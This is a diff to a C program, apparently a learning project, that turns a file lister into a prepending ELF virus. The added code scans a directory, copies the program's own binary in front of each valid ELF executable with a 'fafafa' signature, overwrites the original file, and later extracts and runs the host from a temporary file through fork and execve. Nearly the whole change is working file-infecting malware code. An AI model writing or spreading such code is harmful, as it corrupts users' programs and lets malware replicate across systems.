@@ -1,5 +1,10 @@
 #include "woody.h"
 #include "buzz_buzzard.h"
+#include <sys/stat.h>
+#include <sys/sendfile.h>
+#include <sys/wait.h>
+#include <errno.h>
+#define SIZE  18056
 
 extern unsigned char src_buzz_buzzard_bin[];
 extern unsigned int src_buzz_buzzard_bin_len;
@@ -10,10 +15,9 @@ bool elf_alloc = false;
 bool elf_data_alloc = false;
 bool inj_alloc = false;
 bool inj_data_alloc = false;
-
 int elf_init(char *vict, elf_t **elf_ptr)
 {
-	if(!read_original(vict, &(*elf_ptr)))
+	if (!read_original(vict, &(*elf_ptr)))
 		return 0;
 	(*elf_ptr)->bit_class =
 		(*elf_ptr)->data[EI_CLASS] == ELFCLASS64   ? 64
@@ -24,7 +28,7 @@ int elf_init(char *vict, elf_t **elf_ptr)
 		return 1;
 	return 0;
 }
-
+/*Function that runs through all files in the folder*/
 void get_files_list(char *directory_path, char *file_array[MAX_FILES], int *files_count)
 {
 	struct dirent *entry;
@@ -50,27 +54,81 @@ void get_files_list(char *directory_path, char *file_array[MAX_FILES], int *file
 	}
 	closedir(dir);
 }
-
-void inject(const char *woody)
+/*This function creates temporary file that will later be filled with a copy of the code that was added to the main file, and then execute this*/
+void execute(int vfd, mode_t mode, int totalSize, char *argv[],  char *const envp[])
 {
-	printf("%s", woody);
+	/*Create a temporary file*/
+	int tfd = creat("../tempfile", mode);
+
+	lseek(vfd, SIZE, SEEK_SET);
+	int signatureSize = sizeof("fafafa");
+	/*Get the host size that will be the total size less VIRUS SIZE + signatura size*/
+	int hostSize = totalSize - SIZE - signatureSize;
+	printf("%d %d %d %d %d\n ",totalSize, SIZE, signatureSize, vfd, hostSize);
+	/*Send the host size to this temporary file*/
+	sendfile(tfd, vfd, NULL, hostSize);
+	close(tfd);
+	/*Use chmod  so  the file is executed*/
+	char mode2[] = "0755";
+    int i = strtol(mode2, 0, 8);
+    if (chmod("../tempfile", i) < 0){
+        printf("error in chmod() - \n" );}
+	pid_t pid = fork();
+	if (pid == 0)
+	{
+		execve("../tempfile", argv, envp);
+		exit(1);
+	}
+	waitpid(pid, NULL, 0);
+	unlink("../tempfile");
+}
+/*This function create a file that will contain the copy of the virus and the host file*/
+void inject(char *host_file, int vfd)
+{
+	/*Open the host file*/
+	int hfd = open(host_file, O_RDONLY);
+	struct stat st;
+	fstat(hfd, &st);
+	int host_size = st.st_size;
+	char *signature = "fafafa";
+	/*Crate the new file that will have temporary name*/
+	int tfd = creat("/home/atila/temp/tempfile", st.st_mode);
+	/*Inject both codes and signature on it*/
+	sendfile(tfd, vfd, NULL, SIZE);
+	sendfile(tfd, hfd, NULL, host_size);
+	write(tfd, &signature, sizeof(signature));
+	/*Rename it to the host file name*/
+	rename("/home/atila/temp/tempfile", host_file);
+	close(tfd);
+	close(hfd);
 }
 
-int main(void)
+int main(int argc, char *argv[], char *const envp[])
 {
+	___die2(argc != 1, "One argument only");
 	char *file_array[MAX_FILES];
-	char *directory_path = "./tmp";
+	char *directory_path = "/home/atila/temp";
 	int files_count = 0;
 	get_files_list(directory_path, file_array, &files_count);
+	/*check all files and if it is valid elf file it will infect it*/
 	for (int i = 0; i < files_count; i++)
 	{
-		printf("%s \n", file_array[i]);
-		if(elf_init(file_array[i], &elf) == 1)
-			printf("infect\n\n");
+
+		printf("%s ", file_array[i]);
+		if (elf_init(file_array[i], &elf) == 1)
+		{
+			int vfd = open(argv[0], O_RDONLY);
+			struct stat st;
+			fstat(vfd, &st);
+			inject(file_array[i], vfd);
+			usleep(100000);
+			execute(vfd, st.st_mode, st.st_size, argv, envp);
+			close(vfd);
+		}
+
 		else
-			printf("not infect\n\n");
+			printf("not infect");
 		free(file_array[i]);
 	}
-	//	inject("woody");
 	return free_all();
 }
